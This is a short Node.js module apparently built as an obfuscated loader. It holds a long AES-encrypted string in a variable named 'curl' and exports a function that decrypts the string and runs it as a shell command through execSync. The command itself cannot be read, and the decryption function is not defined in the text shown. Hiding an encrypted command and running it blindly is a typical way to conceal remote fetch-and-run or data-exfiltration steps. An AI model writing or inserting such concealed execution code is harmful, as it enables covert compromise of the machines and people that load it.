const { execSync } = require('child_process');
const curl = `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`;

module.exports = async () => {
    let msg = execSync(AESDecryp(curl));
    return msg;
}